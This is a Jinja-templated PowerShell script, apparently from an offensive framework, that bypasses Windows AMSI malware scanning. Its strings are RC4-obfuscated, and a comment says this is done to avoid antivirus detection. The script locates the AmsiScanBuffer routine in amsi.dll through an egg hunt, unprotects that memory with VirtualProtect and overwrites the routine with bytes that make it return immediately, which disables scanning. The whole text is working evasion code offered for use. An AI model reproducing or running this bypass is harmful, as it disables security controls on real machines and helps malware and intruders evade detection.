{# https://www.contextis.com/en/blog/amsi-bypass #}
{# Obfuscated to avoid AV detection #}
{# Credits: @am0nsec #}

{% set strings = [
    'using System; using System.Runtime.InteropServices; public class Kernel32 { [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName); [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string lpLibFileName); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } ',
    "amsi.dll",
    "DllCanUnloadNow",
] %}

{% for s in strings %}
    $am0nsecstring{{loop.index}} = {{symbol_name("Decrypt-String")}} "{{s|rc4encrypt}}"
{% endfor %}

$am0nsecbytestring1 = {{symbol_name("Decrypt-String")}} {{"4C8BDC49895B0849896B104989731857415641574883EC70"|rc4byteencrypt}}
$am0nsecbytestring2 = {{symbol_name("Decrypt-String")}} {{"8BFF558BEC83EC185356"|rc4byteencrypt}}



Add-Type $am0nsecstring1

Class {{symbol_name("Hunter")}} {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary($am0nsecstring2)

[IntPtr]${{symbol_name("dllCanUnloadNowAddress")}} = [Kernel32]::GetProcAddress($hModule, $am0nsecstring3)

If ([IntPtr]::Size -eq 8) {
    [byte[]]$egg = [System.Convert]::FromBase64String($am0nsecbytestring1)
} Else {
    [byte[]]$egg = [System.Convert]::FromBase64String($am0nsecbytestring2)
}
[IntPtr]${{symbol_name("targetedAddress")}} = [{{symbol_name("Hunter")}}]::FindAddress(${{symbol_name("dllCanUnloadNowAddress")}}, $egg)

$buffer = 0
[Kernel32]::VirtualProtect(${{symbol_name("targetedAddress")}}, [uint32]2, 4, [ref]$buffer) | Out-Null

$patch = [byte[]] (0x31, 0xC0, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, ${{symbol_name("targetedAddress")}}, 3)

$a = 0
[Kernel32]::VirtualProtect(${{symbol_name("targetedAddress")}}, [uint32]2, $buffer, [ref]$a) | Out-Null

